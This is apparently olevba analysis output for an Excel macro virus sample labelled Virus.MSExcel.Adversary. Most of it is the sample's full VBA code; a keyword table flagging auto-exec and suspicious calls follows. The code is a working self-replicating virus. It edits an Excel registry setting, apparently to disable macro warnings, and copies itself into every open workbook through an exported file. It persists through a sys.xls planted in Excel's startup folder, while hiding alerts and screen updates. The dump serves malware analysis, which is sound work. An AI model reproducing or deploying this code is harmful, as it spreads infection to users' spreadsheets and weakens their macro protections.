olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text 'FRIEND
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpSubKey As _
String, ByVal ulOptions As Long, ByVal samDesired As _
Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpValueName As _
String, ByVal Reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" _
(ByVal hKey As Long) As Long
Const HKEY_CURRENT_USER = &H80000001
Const KEY_ALL_ACCESS = &H3F
Const lngData As Long = 0
Const REG_DWORD As Long = 4
Private Sub Workbook_Activate()
Infect
End Sub
Function Infect()
On Error GoTo xnctsg
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Exit Function
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Function
Private Sub Workbook_Open()
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
Application.DisplayAlerts = False
Application.ScreenUpdating = False
For Each wbxxc In Workbooks
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name <> "sys.xls" Then
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
End If
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name = "sys.xls" Then GoTo 99
Next wbxxc
Application.Workbooks.Add
ActiveWorkbook.SaveAs (Application.StartupPath & "\sys.xls")
ActiveWindow.Visible = True
99 On Error GoTo xnctsg
If ThisWorkbook.Name = "sys.xls" Then
Application.Workbooks.Add
End If
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Application.Workbooks("sys.xls").Close savechanges:=True
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
If ThisWorkbook.Name = "sys.xls" Then Exit Sub
Infect
End Sub



























-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Adversary-fbbd9068fb7d65ee3bb7fa936ec13eb9518bd8b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

